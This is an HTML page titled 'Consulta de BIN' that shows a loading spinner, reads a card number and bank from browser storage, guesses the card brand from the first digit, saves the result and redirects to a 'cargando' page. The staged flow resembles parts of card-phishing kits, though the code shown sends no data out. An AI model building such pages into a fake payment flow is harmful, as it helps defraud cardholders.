<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta de BIN</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }

        #loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #555;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 { display: none; }
    </style>
</head>
<body>
    <div id="loader"></div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {

            const datos = JSON.parse(localStorage.getItem('tbdatos'));

            if (!datos || !datos.cardNumber) {
                console.error("No existen datos en localStorage");
                return;
            }

            // Detectar tipo de tarjeta por primer d√≠gito
            const firstDigit = datos.cardNumber[0];
            let cardType = "";

            switch (firstDigit) {
                case '4': cardType = 'Visa'; break;
                case '5': cardType = 'MasterCard'; break;
                case '3': cardType = 'American Express'; break;
                case '6': cardType = 'Discover'; break;
                default:  cardType = 'Desconocido';
            }

            const bank = datos.bank ?? "Desconocido";

            const infoLoad = { bank, cardType };
            localStorage.setItem('infoload', JSON.stringify(infoLoad));

            // Redirigir a cargando.html
            window.location.href = 'cargando.html';

        });
    </script>
</body>
</html>
